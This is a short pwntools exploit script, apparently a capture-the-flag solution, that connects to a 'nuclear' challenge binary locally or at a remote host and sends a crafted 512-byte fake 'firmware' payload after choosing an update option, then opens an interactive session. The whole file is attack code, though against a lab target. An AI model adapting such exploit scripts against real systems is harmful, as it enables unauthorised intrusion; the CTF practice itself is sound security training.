from pwn import *


context.arch = 'amd64'
if args.REMOTE:
    p = remote('lmao.lol', 5002)
elif args.HOST:
    p = process('./nuclear')

firmware_header = b'FW12'

firmware_body = p8(0x00) + p8(0x00)

firmware_tail = b'\x00' * 506

# 组合完整的 payload
payload = firmware_header + firmware_body + firmware_tail
print(payload.decode('utf-8'))
p.sendlineafter(b">> 6447 Nuclear Terminal Facility (Medical Purposes Only)", b"U")
p.sendlineafter(b'>', payload)

p.interactive()
